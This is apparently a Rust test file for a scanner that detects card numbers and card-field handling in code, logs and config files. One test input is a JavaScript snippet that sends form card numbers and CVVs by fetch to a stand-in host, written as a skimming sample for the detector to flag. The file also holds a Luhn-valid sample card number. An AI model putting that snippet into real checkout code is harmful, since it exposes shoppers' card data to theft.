use super::super::{Kind, ids, scan_text};
use super::*;

// A Visa-shaped number that passes Luhn but is not a published test
// number, used only to exercise the detector.
const PAN: &str = "4532015112830366";

#[test]
fn luhn_and_issuer() {
    assert!(luhn("4532015112830366"));
    assert!(!luhn("4532015112830367"));
    assert_eq!(issuer("4532015112830366"), Some("Visa"));
    assert_eq!(issuer("5555555555554444"), Some("Mastercard"));
    assert_eq!(issuer("2223003122003222"), Some("Mastercard"));
    assert_eq!(issuer("378282246310005"), Some("Amex"));
    assert_eq!(issuer("6011000990139424"), Some("Discover"));
    assert_eq!(issuer("1234567890123456"), None, "no known issuer");
}

#[test]
fn a_pan_beside_a_field_or_send_fails_and_a_lone_one_warns() {
    let env = format!("STRIPE_KEY=sk_live_x\nCARD_NUMBER={PAN}\nCVV=123\n");
    let got = scan_text("config/.env", &env, Kind::Repo);
    assert_eq!(ids(&got), [("SUSPECT-CARDHOLDER-DATA", true)], "{got:?}");
    assert!(got[0].note.contains("Visa number in the clear"), "{}", got[0].note);
    assert!(got[0].note.contains("beside a card field"), "{}", got[0].note);
    assert!(!got[0].note.contains(PAN), "the number itself is never echoed: {}", got[0].note);

    let log = format!("2026-11-01T00:00:00Z charge ok {PAN}\n");
    let lone = scan_text("logs/app.log", &log, Kind::Repo);
    assert_eq!(ids(&lone), [("SUSPECT-CARDHOLDER-DATA", false)], "a lone PAN warns: {lone:?}");

    let sep = "primary: 4532 0151 1283 0366\n";
    assert_eq!(
        ids(&scan_text("data/cards.csv", sep, Kind::Repo)),
        [("SUSPECT-CARDHOLDER-DATA", false)],
        "separators are tolerated"
    );
}

#[test]
fn test_numbers_and_test_paths_never_fail() {
    let t = "pm = charge('4111111111111111')\n";
    let got = scan_text("src/pay.py", t, Kind::Repo);
    assert_eq!(ids(&got), [("SUSPECT-CARDHOLDER-DATA", false)], "a published test PAN warns at most");
    assert!(got[0].note.contains("a test Visa number"), "{}", got[0].note);
    let real_but_test = format!("CVV=123\nCARD_NUMBER={PAN}\n");
    assert_eq!(
        ids(&scan_text("tests/fixtures/cards.env", &real_but_test, Kind::Repo)),
        [("SUSPECT-CARDHOLDER-DATA", false)],
        "a fixture path never fails"
    );
}

#[test]
fn collecting_and_sending_card_fields_fails_without_a_literal_number() {
    let js = "const body = { card_number: form.cardNumber, cvv: form.cvv };\nfetch('https://x.y/collect', { method: 'POST', body: JSON.stringify(body) });\n";
    let got = scan_text("src/checkout.js", js, Kind::Repo);
    assert_eq!(ids(&got), [("SUSPECT-CARDHOLDER-DATA", true)], "{got:?}");
    assert!(got[0].note.contains("collects card fields") && got[0].note.contains("PCI DSS"), "{}", got[0].note);
}

#[test]
fn non_cards_and_unread_contexts() {
    assert!(scan_text("src/dial.py", "phone = '415-555-0132'\n", Kind::Repo).is_empty(), "a phone number");
    assert!(
        scan_text("src/t.py", "ts = 20261101000000\nid = 1234567890123456\n", Kind::Repo).is_empty(),
        "a timestamp and a non-issuer run"
    );
    assert!(token_present("a card_number here", "card_number"));
    assert!(!token_present("the panel expanded", "pan"), "pan inside a word is not a card field");
    assert!(scan_text("src/pay.rs", &format!("let n = \"{PAN}\";"), Kind::Repo).is_empty(), "native is not read");
    assert!(scan_text("notes.md", &format!("card {PAN}"), Kind::Repo).is_empty(), "prose is not read here");
}
